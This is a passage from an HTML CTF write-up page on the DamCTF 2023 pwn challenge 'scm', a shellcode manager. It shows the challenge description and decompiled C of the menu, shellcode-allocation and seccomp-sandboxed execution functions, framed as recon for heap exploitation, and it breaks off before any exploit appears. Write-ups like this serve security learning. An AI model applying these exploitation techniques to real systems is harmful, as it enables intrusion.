@@ -1,0 +1,478 @@
+<!doctype html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Writeups</title>
+        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
+        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
+        <script type="text/x-mathjax-config">
+            MathJax.Hub.Config({
+                tex2jax: {
+                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
+                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
+                    processEscapes: true
+                },
+                config: ["MMLorHTML.js"],
+                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
+                extensions: ["MathMenu.js", "MathZoom.js"]
+            });
+        </script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
+    </head>
+    <body>
+        <div id="navbar">
+            <a href="/CTF-writeups" id="root-link">
+                <h2>Rektedekte</h2>
+            </a>
+            <ul id="nav-links">
+				<li><a href="/CTF-writeups/search" class="no-flash">
+					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
+				</a></li>
+                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
+                </a></li>
+                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
+                </a></li>
+                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
+                </a></li>
+            </ul>
+        </div>
+        
+    <div id="content">
+        <h3>
+            <a href="/CTF-writeups\DamCTF 2023">DamCTF 2023</a>
+            <a href="/CTF-writeups\DamCTF 2023\scm/files.zip" class="text-right">Download</a>
+        </h3>
+        <h1>
+            <span>scm</span>
+            <span class="text-right">[~480]</span>
+        </h1>
+        <hr class="no-space">
+        
+            
+    <div class="tags">
+        
+            
+                <a href="/CTF-writeups/search?q=pwn" class="tag">pwn </a>
+            
+        
+    </div>
+
+        
+        
+            <div id="markdown">
+                <h3>Description</h3>
+<p>For this challenge, we are given a binary <code>scm</code> with a corresponding libc library file.</p>
+<blockquote>
+<p><code>Keeping track of your different shellcode payloads is annoying, but the SCM is here to help!</code></p>
+<p><code>nc  chals.damctf.xyz 30200</code></p>
+<p>Downloads:<br />
+<a href="https://gitlab.com/osusec/damctf-2023-challenges/-/raw/main/binary/scm/scm?inline=false">scm</a>, <a href="https://gitlab.com/osusec/damctf-2023-challenges/-/raw/main/binary/scm/libc.so.6?inline=false">libc.so.6</a></p>
+</blockquote>
+<hr />
+<h3>Recon</h3>
+<p>Decompilling the binary, we find it to be stripped. To make the code easier to read, I've gone through and "unstripped" the binary to the best of my ability.<br />
+te<br />
+The main function leads straight into another function, which I have titled <code>menu</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">long</span><span class="w"> </span><span class="nf">menu</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
+
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">choice</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">keep_running</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">choice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">selection</span><span class="p">();</span><span class="w"></span>
+<span class="w">  </span><span class="k">switch</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="k">default</span><span class="o">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">keep_running</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">add_shellcode</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="n">keep_running</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">edit_shellcode</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="n">keep_running</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">execute_shellcode</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="n">keep_running</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="mi">4</span><span class="p">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">show_shellcodes</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="n">keep_running</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="mi">5</span><span class="p">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">delete_shellcode</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="n">keep_running</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="mi">6</span><span class="p">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">keep_running</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="mi">7</span><span class="p">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">mystery</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="n">keep_running</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">keep_running</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>To anyone familier with heap-exploitation, this would seem to be a classical heap-note challenge. Investigating the functions seem to confirm this, namely due to the use of malloc to store structures:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">uint</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nf">get_shellcode</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
+
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">lVar1</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">uint</span><span class="w"> </span><span class="o">*</span><span class="n">shell</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">buff_int</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">shellcode</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">in_FS_OFFSET</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buff</span><span class="w"> </span><span class="p">[</span><span class="mi">50</span><span class="p">];</span><span class="w"></span>
+<span class="w">  </span><span class="n">uint</span><span class="w"> </span><span class="n">size</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">lVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x28</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">buff</span><span class="p">.</span><span class="n">_0_16_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ZEXT816</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">buff</span><span class="p">.</span><span class="n">_16_16_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ZEXT816</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">buff</span><span class="p">.</span><span class="n">_32_16_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ZEXT816</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">buff</span><span class="p">.</span><span class="n">_48_2_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">shell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">uint</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Shellcode type (1=simple, 2=read, 3=write): &quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">fgets</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">buff_int</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strtol</span><span class="p">(</span><span class="n">buff</span><span class="p">,(</span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">shell</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="kt">char</span><span class="p">)</span><span class="n">buff_int</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="kt">int</span><span class="p">)(</span><span class="kt">char</span><span class="p">)</span><span class="n">buff_int</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x1U</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Size of shellcode: &quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">buff</span><span class="p">.</span><span class="n">_0_16_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">undefined</span><span class="w">  </span><span class="p">[</span><span class="mi">16</span><span class="p">])</span><span class="mh">0x0</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">buff</span><span class="p">.</span><span class="n">_16_16_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">undefined</span><span class="w">  </span><span class="p">[</span><span class="mi">16</span><span class="p">])</span><span class="mh">0x0</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">buff</span><span class="p">.</span><span class="n">_32_16_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">undefined</span><span class="w">  </span><span class="p">[</span><span class="mi">16</span><span class="p">])</span><span class="mh">0x0</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">buff</span><span class="p">.</span><span class="n">_48_2_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">fgets</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">buff_int</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strtol</span><span class="p">(</span><span class="n">buff</span><span class="p">,(</span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="o">*</span><span class="n">shell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">buff_int</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">uint</span><span class="p">)</span><span class="n">buff_int</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">99</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Shellcode: &quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">shell</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="n">shellcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">((</span><span class="n">ulong</span><span class="p">)</span><span class="n">size</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">**</span><span class="p">)(</span><span class="n">shell</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shellcode</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">shellcode</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">size</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Bad size!&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">free</span><span class="p">(</span><span class="n">shell</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">shell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">uint</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Bad type!&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">shell</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">shell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">uint</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">lVar1</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x28</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">shell</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
+<span class="w">  </span><span class="n">__stack_chk_fail</span><span class="p">();</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>The program allows us to store shellcodes, defining them as either simple, read or write. We can then specify a size, with a second chunk storing the shellcode we input.</p>
+<p>Looking past the heap, we can then investigate the execution of our shellcode. As arbitrary shellcode would be too powerful for this challenge, the program obviously puts some restrictions down:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">run_shellcode</span><span class="p">(</span><span class="n">uint</span><span class="w"> </span><span class="o">*</span><span class="n">shell</span><span class="p">)</span><span class="w"></span>
+
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">res</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">__pid_t</span><span class="w"> </span><span class="n">pid</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">undefined8</span><span class="w"> </span><span class="o">*</span><span class="n">buff</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">ulong</span><span class="w"> </span><span class="n">uVar1</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">undefined8</span><span class="w"> </span><span class="o">*</span><span class="n">puVar2</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">in_FS_OFFSET</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">byte</span><span class="w"> </span><span class="n">bVar3</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">uint</span><span class="w"> </span><span class="n">status</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">local_20</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">uint</span><span class="w"> </span><span class="n">type</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">bVar3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">local_20</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x28</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Running shellcode...&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">buff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">undefined8</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">4096</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">-1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="o">*</span><span class="n">buff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xc3c3c3c3c3c3c3c3</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">buff</span><span class="p">[</span><span class="mi">511</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xc3c3c3c3c3c3c3c3</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">puVar2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">undefined8</span><span class="w"> </span><span class="o">*</span><span class="p">)((</span><span class="n">ulong</span><span class="p">)(</span><span class="n">buff</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xfffffffffffffff8</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">uVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ulong</span><span class="p">)(((</span><span class="kt">int</span><span class="p">)</span><span class="n">buff</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">undefined8</span><span class="w"> </span><span class="o">*</span><span class="p">)((</span><span class="n">ulong</span><span class="p">)(</span><span class="n">buff</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xfffffffffffffff8</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w"></span>
+<span class="w">                       </span><span class="mh">0x1000U</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">3</span><span class="p">);</span><span class="w"> </span><span class="n">uVar1</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">uVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">uVar1</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="o">*</span><span class="n">puVar2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xc3c3c3c3c3c3c3c3</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">puVar2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">puVar2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">bVar3</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">-2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="n">memcpy</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">**</span><span class="p">)(</span><span class="n">shell</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">),(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="n">shell</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fork</span><span class="p">();</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pid</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">wait</span><span class="p">(</span><span class="o">&amp;</span><span class="n">status</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;done!&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Execution finished with status code %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">status</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">local_20</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x28</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
+<span class="w">    </span><span class="n">__stack_chk_fail</span><span class="p">();</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">shell</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">close</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="n">shell</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">2</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">close</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shell</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shellcode_seccomp</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">joined_r0x00101408</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">type</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shellcode_seccomp</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">joined_r0x00101408</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="p">}</span><span class="w"></span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="k">goto</span><span class="w"> </span><span class="n">LAB_0010141c</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="nl">LAB_0010141c</span><span class="p">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shellcode_seccomp</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="nl">joined_r0x00101408</span><span class="p">:</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">res</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">goto</span><span class="w"> </span><span class="n">LAB_00101438</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
